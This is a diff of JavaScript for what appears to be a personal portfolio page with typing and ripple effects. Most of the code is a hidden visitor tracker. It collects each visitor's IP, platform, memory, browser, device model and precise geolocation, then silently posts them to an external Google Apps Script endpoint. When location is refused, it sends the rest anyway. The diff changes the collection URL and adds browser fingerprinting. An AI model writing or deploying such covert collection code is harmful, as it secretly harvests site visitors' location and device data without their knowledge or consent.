@@ -1,6 +1,24 @@
 (async function() {
-  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyd82Kw9QJroZTRhOYmZWLh88VCotp3UHCWd3dRjpCYHtxYz_-ojBi7wuhOqTPx1vVS-w/exec"; 
+  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby_uW_iHwY-kRtajj3N5aUTLqihoVLHM7zdr-6_CLkmRmJI834MQYvgP45PXOpm7wN6SA/exec"; 
 
+  // --- 1. DETEKSI BROWSER LENGKAP ---
+  const getBrowserInfo = () => {
+    const ua = navigator.userAgent;
+    let tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+    if(/trident/i.test(M[1])){
+        tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+        return 'IE '+(tem[1] || '');
+    }
+    if(M[1]=== 'Chrome'){
+        tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+        if(tem != null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
+    }
+    M = M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+    if((tem = ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
+    return M.join(' ');
+  };
+
+  // --- 2. DETEKSI IPHONE LENGKAP ---
   const getDeviceModel = () => {
     const ua = navigator.userAgent;
     const w = window.screen.width;
@@ -8,8 +26,8 @@
     const r = window.devicePixelRatio;
 
     if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
-      if ((w === 430 && h === 932) || (w === 440 && h === 956)) return "iPhone 15/16 Pro Max";
-      if ((w === 393 && h === 852) || (w === 402 && h === 874)) return "iPhone 15/16 Pro";
+      if ((w === 440 && h === 956) || (w === 430 && h === 932)) return "iPhone 15/16 Pro Max";
+      if ((w === 402 && h === 874) || (w === 393 && h === 852)) return "iPhone 15/16 Pro";
       if (w === 393 && h === 852 && r === 3) return "iPhone 14 Pro / 15 / 16";
       if (w === 390 && h === 844) return "iPhone 12/13/14";
       if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
@@ -18,7 +36,6 @@
       if (w === 375 && h === 812) return "iPhone X/XS/11Pro/mini";
       return "Apple iPhone";
     }
-    
     if (/android/i.test(ua)) {
       const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
       return match ? match[1] : "Android Device";
@@ -31,7 +48,7 @@
       ip: "Checking...",
       platform: navigator.platform,
       ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-      battery: "0",
+      browser: getBrowserInfo(), // DATA BROWSER
       deviceName: getDeviceModel(),
       lat: null, 
       long: null
@@ -43,31 +60,25 @@
       payload.ip = d.ip;
     } catch (e) { payload.ip = "Hidden/VPN"; }
 
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      payload.battery = Math.round(b.level * 100);
-    }
-
     const send = (data) => {
       fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });
     };
 
-    // Cek lokasi
+    // Jalankan Geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((pos) => {
         payload.lat = pos.coords.latitude;
         payload.long = pos.coords.longitude;
         send(payload); 
       }, (err) => {
-        // Jika ditolak, kirim payload TANPA lat/long (akan buat baris baru di Excel)
-        send(payload);
+        send(payload); // Kirim tanpa lokasi jika ditolak
       }, { enableHighAccuracy: true });
     } else {
       send(payload);
     }
   };
 
-  // --- UI EFFECTS (TYPING & RIPPLE) ---
+  // --- 3. UI EFFECTS (TYPING & RIPPLE) ---
   const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
   let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;
 
